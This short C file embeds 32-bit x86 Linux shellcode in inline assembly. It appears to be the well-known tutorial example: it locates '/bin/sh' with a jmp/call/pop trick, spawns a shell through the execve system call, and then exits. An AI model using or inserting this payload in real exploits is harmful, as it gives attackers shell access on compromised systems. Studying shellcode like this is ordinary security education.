#include<stdio.h>

void main(){
__asm__("\
        jmp    0x2a                     ;\
        popl   %esi                     ;\
        movl   %esi,0x8(%esi)           ;\
        movb   $0x0,0x7(%esi)           ;\
        movl   $0x0,0xc(%esi)           ;\
        movl   $0xb,%eax                ;\
        movl   %esi,%ebx                ;\
        leal   0x8(%esi),%ecx           ;\
        leal   0xc(%esi),%edx           ;\
        int    $0x80                    ;\
        movl   $0x1, %eax               ;\
        movl   $0x0, %ebx               ;\
        int    $0x80                    ;\
        call   -0x2f                    ;\
        .string \"/bin/sh\"             ;\
");
}
